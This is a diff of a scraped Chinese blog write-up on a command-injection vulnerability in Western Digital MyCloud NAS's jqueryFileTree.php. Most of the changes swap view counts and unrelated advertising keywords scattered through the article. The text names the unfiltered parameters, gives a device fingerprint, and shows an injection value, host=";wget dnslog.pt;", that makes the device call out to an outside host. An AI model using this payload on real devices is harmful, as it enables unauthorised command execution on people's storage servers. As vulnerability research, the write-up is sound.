@@ -7,13 +7,13 @@ asset_dir: assets/西部数码-nas-jqueryfiletree.php-命令执行漏洞
 # 西部数码 NAS jqueryFileTree.php 命令执行漏洞
 
 [Mrxn](https://mrxn.net/author/1)- 发表于2025/8/12 10:13
-- 671浏览
+- 673浏览
 - [0评论](#comment)
 - 18分钟阅读
 
 深入探索
 
-滙豐卡$2000減$150 WD 3.5吋 4TB My Cloud Home 網絡儲存裝置 wdbvxc0040hwt 香港行貨
+文件传输协议
 
 MyCloud NAS
 
@@ -25,7 +25,7 @@ MyCloud NAS
 
 Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS jqueryFileTree.php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。
 
-漏洞修复方案
+漏洞扫描服务
 
 # 影响版本
 
@@ -38,14 +38,6 @@ Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集�
 > body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "
 
 # 漏洞分析
-
-深入探索
-
-Docker加速服务
-
-编码转换工具
-
-网络安全培训
 
 直接看 `jqueryFileTree.php` 其业务实现逻辑如下
 
@@ -90,11 +82,11 @@ error_reporting(0);
 
 深入探索
 
-Windows安全工具
+漏洞预警服务
 
-网络安全会议
+恶意软件分析工具
 
-安全研究工具
+企业安全咨询
 
 多个参数如`host`、`pwd`、`user`、`dir`、`lang`均未过滤或校验，被直接使用`sprintf`格式化拼接后使用`popen`进行[执行命令](https://mrxn.net/tag/rce)，造成[命令注入漏洞](https://mrxn.net/tag/rce)。
 
@@ -112,7 +104,7 @@ host=";wget dnslog.pt;"
 
 在DNSLOG平台成功收到DNS和HTTP请求
 
-硬盘驱动器
+计算机驱动器和存储设备
 
 - 标签：
 - [#代码](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81)
